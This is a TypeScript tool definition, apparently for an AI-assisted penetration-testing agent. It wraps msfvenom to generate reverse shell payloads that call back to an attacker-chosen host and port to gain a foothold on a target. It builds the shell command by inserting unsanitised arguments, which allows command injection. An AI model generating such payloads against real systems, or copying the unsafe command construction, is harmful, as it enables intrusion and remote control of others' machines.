import { ToolDefinition } from "../types";

export const msfvenomPayloadTool: ToolDefinition = {
  name: "msfvenom_payload",
  description:
    "Generate a well-known stable reverse shell payload for netcat listeners to get foothold of the target",
  args: {
    lhost: {
      type: "string",
      required: true,
      description: "Local host IP address",
    },
    lport: {
      type: "string",
      required: true,
      description: "Local port number",
    },
    payload: {
      type: "string",
      required: true,
      description: "The msfvenom payload to use",
    },
    file_format: {
      type: "string",
      required: true,
      description: "Output file format",
    },
    file_name: {
      type: "string",
      required: true,
      description: "Output filename",
    },
  },
  outputFileField: "file_name",
  async execute({ commandId, args, choice }) {
    if (["yes", "edit"].includes(choice)) {
      const cmd = `msfvenom -p ${args.payload} LHOST=${args.lhost} LPORT=${args.lport} -f ${args.file_format} > ${args.file_name}`;
      const terminalCommand = `echo "Running command - ${commandId}" ; ${cmd} ; echo "Command - ${commandId} - finished"\n`;
      return terminalCommand;
    }
    return args.output ?? "";
  },
};
